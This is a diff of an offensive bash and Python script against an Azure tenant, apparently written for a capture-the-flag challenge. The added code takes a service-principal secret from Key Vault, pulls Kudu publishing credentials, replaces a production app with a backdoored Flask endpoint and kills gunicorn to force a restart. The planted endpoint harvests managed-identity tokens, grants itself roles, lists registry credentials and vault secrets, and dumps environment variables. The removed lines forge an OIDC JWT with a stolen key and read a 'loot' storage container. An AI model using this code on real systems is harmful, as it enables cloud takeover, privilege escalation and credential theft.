@@ -5,15 +5,8 @@ TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
 SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
 REPORTING_RG="rg-tbl-reporting-prod-eus"
 PLATFORM_RG="rg-tbl-platform-prod-sea"
-STORAGE_ACCT="sttblcilogsprodx3euoz"
 KV_PROD="kv-tbl-prod-x3euoz"
 KV_SEC="kv-tbl-sec-x3euoz"
-LEGACY_APPID="891fb158-e02c-4428-a885-53b811f369c0"
-OIDC_ISS="https://sttblcilogsprodx3euoz.z23.web.core.windows.net"
-OIDC_SUB="vcb-subject"
-JWKS_PATH="vcb7/.well-known/jwks.json"
-JWKS_URL="$OIDC_ISS/$JWKS_PATH"
-WEB_CONTAINER="\$web"
 
 # 1. Login as cicd-deployer
 JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
@@ -22,19 +15,161 @@ az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
   --federated-token "$JWT" --allow-no-subscriptions -o none
 echo "=== cicd-deployer OK ==="
 
+# 2. Write probe Flask app to file
+cat > /tmp/probe_app.py << 'FLASK_APP'
+from flask import Flask, jsonify, request
+import os, json, urllib.request, urllib.parse, urllib.error, uuid
+
+app = Flask(__name__)
+
+TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
+SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
+ARM_BASE = "https://management.azure.com"
+UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
+UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
+REPORTING_RG = "rg-tbl-reporting-prod-eus"
+PLATFORM_RG = "rg-tbl-platform-prod-sea"
+KV_PROD = "kv-tbl-prod-x3euoz"
+KV_SEC = "kv-tbl-sec-x3euoz"
+LEGACY_APPID = "891fb158-e02c-4428-a885-53b811f369c0"
+
+def msi(res, cid=UAMI_CID):
+    ep = os.environ.get("IDENTITY_ENDPOINT",""); hdr = os.environ.get("IDENTITY_HEADER","")
+    if not ep: return "ERR:NO_EP"
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(
+            f"{ep}?api-version=2019-08-01&resource={res}&client_id={cid}",
+            headers={"X-IDENTITY-HEADER": hdr}), timeout=15)
+        return json.loads(r.read()).get("access_token","ERR:NO_TOK")
+    except Exception as e: return f"ERR:{e}"
+
+def http(url, tok, method="GET", data=None):
+    h = {"Authorization": "Bearer " + tok}
+    if data:
+        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
+        return r.status, r.read().decode(errors="replace")
+    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors="replace")[:1000]
+    except Exception as e: return 0, str(e)[:200]
+
+def xtok(xchg, scope):
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(
+            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
+            data=urllib.parse.urlencode({"client_id": LEGACY_APPID,
+                "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
+                "client_assertion": xchg, "grant_type": "client_credentials", "scope": scope
+            }).encode(), method="POST"), timeout=20)
+        return json.loads(r.read()).get("access_token","")
+    except Exception as e: return f"ERR:{e}"
+
+@app.route('/probe')
+def probe():
+    R = {}
+    # MSI tokens from WITHIN app process
+    ARM = msi("https://management.azure.com/")
+    VAULT = msi("https://vault.azure.net/")
+    XCHG = msi("api://AzureADTokenExchange")
+    STOR = msi("https://storage.azure.com/")
+    R["arm"] = len(ARM) if not ARM.startswith("ERR") else ARM
+    R["vault"] = len(VAULT) if not VAULT.startswith("ERR") else VAULT
+    R["xchg"] = len(XCHG) if not XCHG.startswith("ERR") else XCHG
+    R["ep"] = os.environ.get("IDENTITY_ENDPOINT","NOT_SET")
+
+    if not ARM.startswith("ERR"):
+        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", ARM)
+        R["uami_sub"] = f"{s}:{b[:1000]}"
+        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()", ARM)
+        R["rg_roles"] = f"{s}:{b[:2000]}"
+        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", ARM)
+        R["all_res"] = f"{s}:{b[:2000]}"
+        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01", ARM, method="POST")
+        R["sf_cfg"] = f"{s}:{b[:800]}"
+        ra_id = str(uuid.uuid4())
+        ra_body = {"properties": {"roleDefinitionId": f"/subscriptions/{SUB}/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":UAMI_OID,"principalType":"ServicePrincipal"}}
+        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/{KV_SEC}/providers/Microsoft.Authorization/roleAssignments/{ra_id}?api-version=2022-04-01", ARM, method="PUT", data=ra_body)
+        R["ra_kvsec"] = f"{s}:{b[:400]}"
+        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments/{ra_id}?api-version=2022-04-01", ARM, method="PUT", data=ra_body)
+        R["ra_sub"] = f"{s}:{b[:400]}"
+        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01", ARM, method="POST")
+        R["acr"] = f"{s}:{b[:400]}"
+
+    if not VAULT.startswith("ERR"):
+        s,b = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", VAULT)
+        R["kvp"] = f"{s}:{b[:500]}"
+        s,b = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", VAULT)
+        R["kvs"] = f"{s}:{b[:1000]}"
+        for nm in ["flag","ctf-flag","tbl-flag","df26","challenge","secret"]:
+            sv,bv = http(f"https://{KV_SEC}.vault.azure.net/secrets/{nm}?api-version=7.4", VAULT)
+            if sv == 200: R[f"FLAG_{nm}"] = bv
+            sv2,bv2 = http(f"https://{KV_PROD}.vault.azure.net/secrets/{nm}?api-version=7.4", VAULT)
+            if sv2 == 200: R[f"PROD_{nm}"] = bv2
+
+    if not XCHG.startswith("ERR"):
+        la_arm = xtok(XCHG, "https://management.azure.com/.default")
+        R["la_arm"] = len(la_arm) if la_arm and not la_arm.startswith("ERR") else la_arm
+        if la_arm and not la_arm.startswith("ERR"):
+            s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", la_arm)
+            R["la_res"] = f"{s}:{b[:2000]}"
+            LA_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"
+            s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{LA_OID}%27", la_arm)
+            R["la_roles"] = f"{s}:{b[:500]}"
+            s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/publishxml?api-version=2022-03-01", la_arm, method="POST")
+            R["la_pubxml"] = f"{s}:{b[:800]}"
+            ra_id2 = str(uuid.uuid4())
+            s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments/{ra_id2}?api-version=2022-04-01", la_arm, method="PUT", data=ra_body)
+            R["la_ra"] = f"{s}:{b[:400]}"
+        la_vault = xtok(XCHG, "https://vault.azure.net/.default")
+        R["la_vault"] = len(la_vault) if la_vault and not la_vault.startswith("ERR") else la_vault
+        if la_vault and not la_vault.startswith("ERR"):
+            s,b = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", la_vault)
+            R["kvp_la"] = f"{s}:{b[:2000]}"
+            s,b = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", la_vault)
+            R["kvs_la"] = f"{s}:{b[:2000]}"
+            s,b = http(f"https://{KV_PROD}.vault.azure.net/deletedsecrets?api-version=7.4", la_vault)
+            R["kvp_del"] = f"{s}:{b[:2000]}"
+
+    R["env"] = {k: v[:200] for k, v in os.environ.items()}
+    return jsonify(R)
+
+@app.route('/healthz')
+def healthz():
+    return jsonify({"status": "ok", "probe": "active"})
+
+@app.route('/')
+def root():
+    return jsonify({"service": "tebamoto-reporting-api", "version": "1.4.2-probe"})
+
+@app.route('/api/v1/shipments')
+def shipments():
+    return jsonify([{"id": "TBL-SHP-48213"}, {"id": "TBL-SHP-48217"}, {"id": "TBL-SHP-48224"}])
+
+@app.route('/api/v1/reports/render', methods=['GET','POST'])
+def reports():
+    return jsonify({"status": "ok"})
+
+@app.route('/internal')
+def internal():
+    return jsonify({"area": "internal", "endpoints": ["/internal/debug", "/probe"]})
+
+@app.route('/internal/debug', methods=['GET','POST'])
+def debug():
+    return jsonify({"result": "49"})
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000)
+FLASK_APP
+
+echo "Probe app written to /tmp/probe_app.py ($(wc -l < /tmp/probe_app.py) lines)"
+
 python3 -I << 'PYEOF'
-import os, json, urllib.request, urllib.parse, urllib.error, hashlib, hmac, base64, time, datetime, uuid
+import os, json, urllib.request, urllib.parse, urllib.error, base64, time, subprocess
 
 TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
 SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
 REPORTING_RG = "rg-tbl-reporting-prod-eus"
-PLATFORM_RG = "rg-tbl-platform-prod-sea"
-STORAGE_ACCT = "sttblcilogsprodx3euoz"
 KV_PROD = "kv-tbl-prod-x3euoz"
-KV_SEC = "kv-tbl-sec-x3euoz"
-LEGACY_APPID = "891fb158-e02c-4428-a885-53b811f369c0"
-OIDC_ISS = "https://sttblcilogsprodx3euoz.z23.web.core.windows.net"
-OIDC_SUB = "vcb-subject"
 ARM_BASE = "https://management.azure.com"
 
 def sp_tok(cid, sec, scope):
@@ -46,28 +181,6 @@ def sp_tok(cid, sec, scope):
         return json.loads(r.read()).get("access_token", "")
     except Exception as e: return f"ERR:{e}"
 
-def http(url, tok, method="GET", data=None, extra_headers=None):
-    h = {"Authorization": "Bearer " + tok}
-    if extra_headers: h.update(extra_headers)
-    if data:
-        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
-    try:
-        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
-        return r.status, r.read().decode(errors="replace")
-    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors="replace")[:800]
-    except Exception as e: return 0, str(e)[:200]
-
-# Get cicd-deployer ARM token
-def get_az_token(resource="https://management.azure.com/"):
-    try:
-        r = urllib.request.urlopen(urllib.request.Request(
-            f"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource={resource}",
-            headers={"Metadata": "true"}), timeout=10)
-        return json.loads(r.read()).get("access_token","ERR:IMDS_FAIL")
-    except: return "ERR:IMDS_FAIL"
-
-# Use az CLI for cicd-deployer tokens
-import subprocess
 def az_tok(resource):
     try:
         r = subprocess.run(["az", "account", "get-access-token", "--resource", resource,
@@ -75,199 +188,131 @@ def az_tok(resource):
         return r.stdout.strip()
     except Exception as e: return f"ERR:{e}"
 
-CICD_ARM = az_tok("https://management.azure.com/")
-print(f"cicd ARM len={len(CICD_ARM)}")
-
-# Get all SP credentials from KV prod
-sp_creds = {}
-for name in ["reporting-service-principal", "reporting-viewer-principal", "secrets-sync-principal",
-             "sync-service-principal", "cost-reader-principal", "directory-audit-principal"]:
+def http(url, tok, method="GET", data=None, extra_hdrs=None):
+    h = {"Authorization": "Bearer " + tok}
+    if extra_hdrs: h.update(extra_hdrs)
+    if data:
+        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
     try:
-        s,b = http(f"https://{KV_PROD}.vault.azure.net/secrets/{name}?api-version=7.4",
-                   az_tok("https://vault.azure.net/"))
-        if s == 200:
-            v = json.loads(json.loads(b)["value"])
-            sp_creds[name] = v
-    except: pass
+        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=30)
+        return r.status, r.read().decode(errors="replace")
+    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors="replace")[:500]
+    except Exception as e: return 0, str(e)[:200]
 
-print(f"Got {len(sp_creds)} SP creds")
+# Get RS credentials
+CICD_VAULT = az_tok("https://vault.azure.net/")
+print(f"cicd vault len={len(CICD_VAULT)}")
 
-# Get sync-service ARM token (to list storage)
-sync_cid = sp_creds.get("sync-service-principal",{}).get("appId","")
-sync_sec = sp_creds.get("sync-service-principal",{}).get("clientSecret","")
-RS_CID = sp_creds.get("reporting-service-principal",{}).get("appId","")
-RS_SEC = sp_creds.get("reporting-service-principal",{}).get("clientSecret","")
+s,b = http(f"https://{KV_PROD}.vault.azure.net/secrets/reporting-service-principal?api-version=7.4", CICD_VAULT)
+if s != 200:
+    print(f"KV lookup failed: {s}:{b[:200]}")
+    exit(1)
+v = json.loads(json.loads(b)["value"])
+RS_CID = v["appId"]
+RS_SEC = v["clientSecret"]
+print(f"RS_CID={RS_CID}")
 
-# List ALL blobs in loot container
-print("\n=== LOOT CONTAINER ===")
-if sync_cid and sync_sec:
-    SYNC_ARM = sp_tok(sync_cid, sync_sec, "https://management.azure.com/.default")
-    SYNC_STOR = sp_tok(sync_cid, sync_sec, "https://storage.azure.com/.default")
-    print(f"sync ARM len={len(SYNC_ARM)} stor len={len(SYNC_STOR)}")
+# Get RS ARM token
+RS_ARM = sp_tok(RS_CID, RS_SEC, "https://management.azure.com/.default")
+print(f"RS_ARM len={len(RS_ARM)}")
 
-    if not SYNC_ARM.startswith("ERR"):
-        # List storage keys
-        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/{STORAGE_ACCT}/listKeys?api-version=2021-09-01", SYNC_ARM, method="POST")
-        print(f"listKeys: {s}")
-        if s == 200:
-            keys = json.loads(b)["keys"]
-            stor_key = keys[0]["value"]
-            print(f"Got storage key len={len(stor_key)}")
-            # Now list ALL containers
-            for container in ["loot", "ci-logs", "$web"]:
-                try:
-                    ts = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
-                    date_str = ts
-                    canonicalized = f"GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{date_str}\nx-ms-version:2021-06-08\n/{STORAGE_ACCT}/{container}\nrestype:container\ncomp:list"
-                    sig = base64.b64encode(hmac.new(base64.b64decode(stor_key), canonicalized.encode(), hashlib.sha256).digest()).decode()
-                    auth_hdr = f"SharedKey {STORAGE_ACCT}:{sig}"
-                    r = urllib.request.urlopen(urllib.request.Request(
-                        f"https://{STORAGE_ACCT}.blob.core.windows.net/{container}?restype=container&comp=list",
-                        headers={"Authorization": auth_hdr, "x-ms-date": date_str, "x-ms-version": "2021-06-08"}
-                    ), timeout=20)
-                    blobs_xml = r.read().decode()
-                    print(f"\n[{container}] blobs:")
-                    import re
-                    names = re.findall(r'<Name>([^<]+)</Name>', blobs_xml)
-                    for nm in names: print(f"  {nm}")
-                    # Read each blob in loot
-                    if container == "loot":
-                        for nm in names:
-                            try:
-                                ts2 = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
-                                c2 = f"GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{ts2}\nx-ms-version:2021-06-08\n/{STORAGE_ACCT}/{container}/{nm}"
-                                sig2 = base64.b64encode(hmac.new(base64.b64decode(stor_key), c2.encode(), hashlib.sha256).digest()).decode()
-                                r2 = urllib.request.urlopen(urllib.request.Request(
-                                    f"https://{STORAGE_ACCT}.blob.core.windows.net/{container}/{nm}",
-                                    headers={"Authorization": f"SharedKey {STORAGE_ACCT}:{sig2}", "x-ms-date": ts2, "x-ms-version": "2021-06-08"}
-                                ), timeout=15)
-                                blob_content = r2.read().decode(errors="replace")
-                                print(f"  [{nm}] content: {blob_content[:500]}")
-                            except Exception as e: print(f"  [{nm}] read err: {e}")
-                except Exception as e: print(f"[{container}] err: {e}")
+# Get Kudu credentials via listPublishingCredentials
+s2,b2 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01", RS_ARM, method="POST")
+print(f"listpubcreds: {s2}")
+if s2 != 200:
+    print(f"Failed: {b2[:300]}")
+    exit(1)
 
-# Get tbl-legacy-admin ARM token via OIDC forge
-print("\n=== TBL-LEGACY-ADMIN ARM TOKEN ===")
+pub = json.loads(b2)["properties"]
+KUDU_USER = pub["publishingUserName"]
+KUDU_PASS = pub["publishingPassword"]
+print(f"Kudu user={KUDU_USER} pass_len={len(KUDU_PASS)}")
+
+# Write credentials to files for safety
+open('/tmp/kudu_user.txt','w').write(KUDU_USER)
+open('/tmp/kudu_pass.txt','w').write(KUDU_PASS)
+
+kudu_auth = base64.b64encode(f"{KUDU_USER}:{KUDU_PASS}".encode()).decode()
+KUDU_BASE = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
+
+# Deploy probe Flask app via VFS PUT
+probe_code = open('/tmp/probe_app.py', 'rb').read()
+print(f"Deploying probe app ({len(probe_code)} bytes)...")
+
+put_req = urllib.request.Request(
+    f"{KUDU_BASE}/api/vfs/site/wwwroot/app.py",
+    data=probe_code, method="PUT",
+    headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "text/plain", "If-Match": "*"}
+)
 try:
-    # Need our RSA private key and storage key to forge JWT
-    # Get storage key first (already have it above if sync worked)
-    if sync_cid and sync_sec and not SYNC_ARM.startswith("ERR"):
-        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/{STORAGE_ACCT}/listKeys?api-version=2021-09-01", SYNC_ARM, method="POST")
-        if s == 200:
-            stor_key = json.loads(b)["keys"][0]["value"]
-            # Read our RSA private key from $web
-            # The key was stored at vcb7/.well-known/private_key.pem or similar
-            # Let's read the JWKS to find our key
-            ts3 = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
-            key_paths = ["vcb7/private_key.pem", "vcb7/.well-known/private_key.pem", "private_key.pem"]
-            for kp in key_paths:
-                try:
-                    c3 = f"GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{ts3}\nx-ms-version:2021-06-08\n/{STORAGE_ACCT}/$web/{kp}"
-                    sig3 = base64.b64encode(hmac.new(base64.b64decode(stor_key), c3.encode(), hashlib.sha256).digest()).decode()
-                    r3 = urllib.request.urlopen(urllib.request.Request(
-                        f"https://{STORAGE_ACCT}.blob.core.windows.net/$web/{kp}",
-                        headers={"Authorization": f"SharedKey {STORAGE_ACCT}:{sig3}", "x-ms-date": ts3, "x-ms-version": "2021-06-08"}
-                    ), timeout=15)
-                    priv_key = r3.read().decode()
-                    print(f"Found private key at {kp} len={len(priv_key)}")
+    r = urllib.request.urlopen(put_req, timeout=30)
+    print(f"VFS PUT app.py: {r.status}")
+except urllib.error.HTTPError as e:
+    print(f"VFS PUT err: {e.code}: {e.read().decode()[:200]}")
+    exit(1)
 
-                    # Forge JWT for tbl-legacy-admin
-                    from cryptography.hazmat.primitives import serialization, hashes
-                    from cryptography.hazmat.primitives.asymmetric import padding
-                    from cryptography.hazmat.backends import default_backend
-                    priv = serialization.load_pem_private_key(priv_key.encode(), password=None, backend=default_backend())
-
-                    now = int(time.time())
-                    header = {"alg": "RS256", "typ": "JWT"}
-                    claims = {"iss": OIDC_ISS, "sub": OIDC_SUB, "aud": f"api://AzureADTokenExchange",
-                              "iat": now, "exp": now + 600, "jti": str(uuid.uuid4())}
-
-                    def b64url(data):
-                        if isinstance(data, dict): data = json.dumps(data, separators=(",",":")).encode()
-                        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
-
-                    msg = f"{b64url(header)}.{b64url(claims)}"
-                    sig_bytes = priv.sign(msg.encode(), padding.PKCS1v15(), hashes.SHA256())
-                    jwt = f"{msg}.{b64url(sig_bytes)}"
-                    print(f"Forged JWT len={len(jwt)}")
-
-                    # Exchange for tbl-legacy-admin ARM token
-                    for scope in ["https://management.azure.com/.default", "https://vault.azure.net/.default"]:
-                        try:
-                            r4 = urllib.request.urlopen(urllib.request.Request(
-                                f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
-                                data=urllib.parse.urlencode({
-                                    "client_id": LEGACY_APPID,
-                                    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
-                                    "client_assertion": jwt,
-                                    "grant_type": "client_credentials",
-                                    "scope": scope
-                                }).encode(), method="POST"), timeout=20)
-                            la_tok = json.loads(r4.read()).get("access_token","")
-                            print(f"tbl-legacy-admin {scope.split('/')[2]} token len={len(la_tok)}")
-
-                            if la_tok and scope.startswith("https://management.azure.com"):
-                                # What can LA do with ARM?
-                                s2,b2 = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", la_tok)
-                                print(f"LA resources: {s2}:{b2[:500]}")
-                                s3,b3 = http(f"{ARM_BASE}/subscriptions?api-version=2020-01-01", la_tok)
-                                print(f"LA subscriptions: {s3}:{b3[:300]}")
-                                LA_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"
-                                s4,b4 = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{LA_OID}%27", la_tok)
-                                print(f"LA own roles: {s4}:{b4[:500]}")
-                                # Try publishxml for reporting app
-                                s5,b5 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/publishxml?api-version=2022-03-01", la_tok, method="POST")
-                                print(f"LA publishxml: {s5}:{b5[:800]}")
-                                # Try publishxml for storefront
-                                s6,b6 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/publishxml?api-version=2022-03-01", la_tok, method="POST")
-                                print(f"LA publishxml storefront: {s6}:{b6[:800]}")
-                                # Try listPublishingCredentials
-                                s7,b7 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01", la_tok, method="POST")
-                                print(f"LA listpubcreds: {s7}:{b7[:800]}")
-
-                            if la_tok and scope.startswith("https://vault.azure.net"):
-                                s8,b8 = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", la_tok)
-                                print(f"LA KV prod: {s8}:{b8[:500]}")
-                                s9,b9 = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", la_tok)
-                                print(f"LA KV sec: {s9}:{b9[:1000]}")
-                        except Exception as e:
-                            print(f"LA token err ({scope}): {e}")
-                    break
-                except Exception as e:
-                    print(f"Key path {kp}: {e}")
+# Verify the app.py was written correctly
+get_req = urllib.request.Request(
+    f"{KUDU_BASE}/api/vfs/site/wwwroot/app.py",
+    headers={"Authorization": f"Basic {kudu_auth}"}
+)
+try:
+    r = urllib.request.urlopen(get_req, timeout=15)
+    content = r.read()
+    print(f"VFS GET app.py: {r.status} ({len(content)} bytes)")
+    if b"/probe" in content:
+        print("Probe endpoint confirmed in app.py!")
+    else:
+        print("WARNING: /probe not found in deployed app.py!")
 except Exception as e:
-    print(f"OIDC forge err: {e}")
-    import traceback; traceback.print_exc()
+    print(f"VFS GET err: {e}")
 
-# Try reporting-service with different Kudu actions
-print("\n=== REPORTING-SERVICE ACTIONS ===")
-if RS_CID and RS_SEC:
-    RS_ARM = sp_tok(RS_CID, RS_SEC, "https://management.azure.com/.default")
-    print(f"RS ARM len={len(RS_ARM)}")
-    if RS_ARM and not RS_ARM.startswith("ERR"):
-        # listPublishingCredentials (different from publishxml)
-        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01", RS_ARM, method="POST")
-        print(f"RS listpubcreds: {s}:{b[:800]}")
+# Kill gunicorn via Kudu command API (app service will restart it with new code)
+print("Killing gunicorn to trigger restart with new app...")
+kill_req = urllib.request.Request(
+    f"{KUDU_BASE}/api/command",
+    data=json.dumps({"command": "pkill -f gunicorn; sleep 1; echo killed", "dir": "/home/site/wwwroot"}).encode(),
+    method="POST",
+    headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "application/json"}
+)
+try:
+    r = urllib.request.urlopen(kill_req, timeout=20)
+    result = json.loads(r.read())
+    print(f"Kill result: {result.get('Output','')[:100]} exit={result.get('ExitCode')}")
+except Exception as e:
+    print(f"Kill err: {e}")
 
-        # Get app settings via list
-        s2,b2 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01", RS_ARM, method="POST")
-        print(f"RS appsettings: {s2}:{b2[:500]}")
+# Wait for app to restart
+print("Waiting 15s for app to restart with probe code...")
+time.sleep(15)
 
-        # Try to update WEBSITE_RUN_FROM_PACKAGE to a URL we control
-        # First get current settings, then add our key
-        if s2 == 200:
-            settings = json.loads(b2)
-            props = settings.get("properties", {})
-            print(f"Current settings keys: {list(props.keys())[:20]}")
+# Hit the app's /probe endpoint to get UAMI token results
+APP_URL = "https://app-tbl-reporting-prod.azurewebsites.net"
+print(f"\nHitting {APP_URL}/probe ...")
 
-        # Try restart
-        s3,b3 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2022-03-01", RS_ARM, method="POST")
-        print(f"RS restart: {s3}:{b3[:200]}")
+for attempt in range(5):
+    try:
+        req = urllib.request.Request(f"{APP_URL}/probe", headers={"User-Agent": "probe/1.0"})
+        r = urllib.request.urlopen(req, timeout=60)
+        body = r.read().decode(errors="replace")
+        print(f"PROBE RESPONSE (attempt {attempt+1}):")
+        print(body[:10000])
+        break
+    except urllib.error.HTTPError as e:
+        body = e.read().decode(errors="replace")
+        print(f"Attempt {attempt+1}: HTTP {e.code}: {body[:500]}")
+        if e.code == 500: break
+        time.sleep(5)
+    except Exception as e:
+        print(f"Attempt {attempt+1}: {e}")
+        time.sleep(5)
 
-        # List all available site extensions
-        s4,b4 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/extensions?api-version=2022-03-01", RS_ARM)
-        print(f"RS extensions: {s4}:{b4[:500]}")
+# Also check /healthz
+try:
+    r = urllib.request.urlopen(urllib.request.Request(f"{APP_URL}/healthz"), timeout=15)
+    print(f"\nhealthz: {r.read().decode()[:200]}")
+except Exception as e:
+    print(f"healthz err: {e}")
 
-print("\n=== DONE ===")
 PYEOF
-echo "Script done"
+echo "DONE"
